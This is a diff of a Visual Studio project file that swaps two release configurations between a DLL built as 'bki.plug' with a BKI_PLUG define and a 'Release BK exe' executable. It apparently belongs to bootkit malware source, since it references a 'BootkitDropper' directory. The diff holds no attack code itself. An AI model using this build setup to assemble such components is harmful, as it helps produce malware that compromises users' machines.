@@ -93,7 +93,7 @@
 			Name="Release|Win32"
 			OutputDirectory="$(SolutionDir)Bin\$(ConfigurationName)"
 			IntermediateDirectory="Objs\$(ConfigurationName)"
-			ConfigurationType="1"
+			ConfigurationType="2"
 			CharacterSet="0"
 			WholeProgramOptimization="1"
 			>
@@ -119,7 +119,7 @@
 				FavorSizeOrSpeed="2"
 				WholeProgramOptimization="false"
 				AdditionalIncludeDirectories="..\BootkitDropper;..\..\Source\Misc;..\..\Source\Common;..\..\Source\Core;..\..\Source;Modules;..\..\include"
-				PreprocessorDefinitions="WIN32;NDEBUG;_WINDOWS"
+				PreprocessorDefinitions="WIN32;NDEBUG;_WINDOWS;BKI_PLUG"
 				StringPooling="true"
 				ExceptionHandling="0"
 				RuntimeLibrary="2"
@@ -143,6 +143,7 @@
 			<Tool
 				Name="VCLinkerTool"
 				AdditionalDependencies="taskschd.lib"
+				OutputFile="$(OutDir)\bki.plug"
 				LinkIncremental="1"
 				GenerateManifest="false"
 				IgnoreAllDefaultLibraries="true"
@@ -351,10 +352,10 @@
 			/>
 		</Configuration>
 		<Configuration
-			Name="Release DLL|Win32"
+			Name="Release BK exe|Win32"
 			OutputDirectory="$(SolutionDir)Bin\Release"
 			IntermediateDirectory="Objs\$(ConfigurationName)"
-			ConfigurationType="2"
+			ConfigurationType="1"
 			CharacterSet="0"
 			WholeProgramOptimization="1"
 			>
@@ -380,7 +381,7 @@
 				FavorSizeOrSpeed="2"
 				WholeProgramOptimization="false"
 				AdditionalIncludeDirectories="..\BootkitDropper;..\..\Source\Misc;..\..\Source\Common;..\..\Source\Core;..\..\Source;Modules;..\..\include"
-				PreprocessorDefinitions="WIN32;NDEBUG;_WINDOWS;BKI_PLUG"
+				PreprocessorDefinitions="WIN32;NDEBUG;_WINDOWS"
 				StringPooling="true"
 				ExceptionHandling="0"
 				RuntimeLibrary="2"
@@ -404,7 +405,7 @@
 			<Tool
 				Name="VCLinkerTool"
 				AdditionalDependencies="taskschd.lib"
-				OutputFile="$(OutDir)\bki.plug"
+				OutputFile="$(OutDir)\$(ProjectName).exe"
 				LinkIncremental="1"
 				GenerateManifest="false"
 				IgnoreAllDefaultLibraries="true"
